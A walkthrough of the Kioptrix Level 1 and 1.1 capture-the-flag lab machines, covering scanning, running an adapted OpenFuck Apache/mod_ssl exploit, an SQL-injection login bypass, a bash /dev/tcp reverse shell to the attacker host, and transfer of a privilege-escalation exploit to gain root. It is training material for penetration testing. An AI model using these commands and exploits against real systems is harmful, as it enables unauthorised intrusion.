# kioptrix-full-walkthrough
<h1>Kioptrix Level 1</h1>

Step 1:
Downloading machine and setting up.

Step 2:
Run netdiscover to learn the machine IP.

`sudo netdiscover -i eth0`

![image](https://user-images.githubusercontent.com/31168741/199799872-1a04ded4-b40c-4cae-b085-f970aee67bd2.png)

Note: Found out by the mac address.

Step 3:
Run nmap scan on the machine IP that we found.

`sudo nmap -sS -A -p- [machine-ip] -T4`

![image](https://user-images.githubusercontent.com/31168741/199800031-894a8f69-a2f0-4585-8d1f-84a3fceba8c4.png)
![image](https://user-images.githubusercontent.com/31168741/199800056-715a15f8-f636-40f8-801f-0a477a7fef28.png)
nmap result as found above!

Step 4:
Running some other tools to enumerate as much information as possible from the machine.

`enum4linux [machine-ip]`

`dirsearch -u http://[machine-ip]`

Step 5:
Now we browse for available exploits.

As shown in the output, the target system is using a very outdated Apache web server version 1.3.20. We Google for **“apache 1.3.20 vulnerability”**.

Search for the exploit via searchsploit:

`searchsploit OpenFuck`

![image](https://user-images.githubusercontent.com/31168741/199801410-e466b70b-3dce-477a-8ceb-eea0ec90c4aa.png)

## Modify the exploit code:

Simply make a copy of the <b>764.c</b> exploit and put it somewhere to check it out and make changes to it (because the ‘off-the-shell’ code over there is pretty outdated)

`cp /usr/share/exploitdb/exploits/unix/remote/764.c OpenFuck.c`

Here, we need to make some modification to the code before compiling it. Can be done using any text editor such as nano or vim.

`vim OpenFuck.c`

Below are the list of changes which are needed to be made to the <b>OpenFuck.c</b> code,

**Include the openssl rc4 and md5 libraries:**

>#include <openssl/rc4.h>

>#include <openssl/md5.h>

Modify the <b>‘wget’</b> method in the exploit itself because the url does not exist anymore. we need to update it to become the new URL to download the file.
Search for <b>‘wget’</b> in the exploit, and then replace the URL to <b>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</b>

**Install Libraries for compiling the modified exploit code:**

> apt-get install libssl-dev

> gcc -o OpenFuck OpenFuck.c -lcrypto

Running the exploit,

`./OpenFuck 0x6b <i><b>[machine-ip]</b></i> 443 -c 40`

![image](https://user-images.githubusercontent.com/31168741/199802750-a1c211c4-c945-4549-bc19-98446b53831b.png)

It worked!

<h1>Kioptrix Level 1.1(2)</h1>

Step 1:
Follow Step 1 & Step 2 from previous one as described to set the machine up and discovering machine IP.

Step 2:
Run nmap scan on the machine IP that we found.

`sudo nmap -sS -A -p- [machine-ip] -T4`

![image](https://user-images.githubusercontent.com/31168741/199806144-1718d44e-5564-429a-8f5e-58d748009ca2.png)

Step 3:
Let’s take a deeper dive by inspecting what lies in the open port i.e. ***[machine-ip]***:80

**N.B.** I reinstalled the machine, ts why the ip changed.

![image](https://user-images.githubusercontent.com/31168741/199806234-c60c90b3-8521-469f-99b3-da5d9e2a0486.png)

Whoa! A login form. From the nmap scan, we notice the web application is using unauthorized mysql. This is vulnerable to SQLi. It turns out the authentication can be bypassed by using the following payload in the username field:

![image](https://user-images.githubusercontent.com/31168741/199806285-5834b923-b39b-4cb1-b2cf-9411302889bf.png)

But we need a shell to operate more flexibly.

![image](https://user-images.githubusercontent.com/31168741/199806351-02b40ddb-6bdf-40a1-a4ee-c683b919f39d.png)

![image](https://user-images.githubusercontent.com/31168741/199806383-709bfcfa-928e-49b6-b1fc-032eacd73d21.png)

So, we setup a listener and using a BASH reverse shell to connect to the listener; putting the script below inside the console that we just took privilege:

`bash -i >& /dev/tcp/<i><b>[host-ip]</b></i>/1234 0>&1` (host machine)

![image](https://user-images.githubusercontent.com/31168741/199806457-c234670e-b98c-4e34-a371-d713d3d11328.png)

We are into the shell! We look around for more info.

![image](https://user-images.githubusercontent.com/31168741/199806517-f0a4fc1d-17db-4f9d-b62d-46e0f8d2f0a6.png)

![image](https://user-images.githubusercontent.com/31168741/199806565-fba7cafa-d421-4b98-9f6f-fffa2ffb736a.png)

Step 4:
Looking out for available exploits regarding the version privilege escalation.

![image](https://user-images.githubusercontent.com/31168741/199806647-16bb2db6-10e1-43ec-8ed1-1d9c67b52842.png)

We find one and download the exploit.

![image](https://user-images.githubusercontent.com/31168741/199806720-0134067b-2762-48ca-b830-ee4d28153eb8.png)

Step 5:
Running a python server in the host machine so that we can copy the exploit to the target machine.

![image](https://user-images.githubusercontent.com/31168741/199806805-4fb64c04-ee75-4a27-a721-e9ef97397e13.png)

Transferring the exploit to the target machine using the Python web server and wget:

![image](https://user-images.githubusercontent.com/31168741/199806868-7bcfbb84-a83c-41ad-9573-34c9027566ce.png)

It’s copied. (We are downloading basically!)

Step 6:
Compiling the exploit using GCC, allocating execute permissions to it and executing it:

![image](https://user-images.githubusercontent.com/31168741/199806960-7773eaf1-1689-47b7-859b-95f29d6f672e.png)

Now we are in the root!

<h1>Kioptrix Level 1.2(3)</h1>
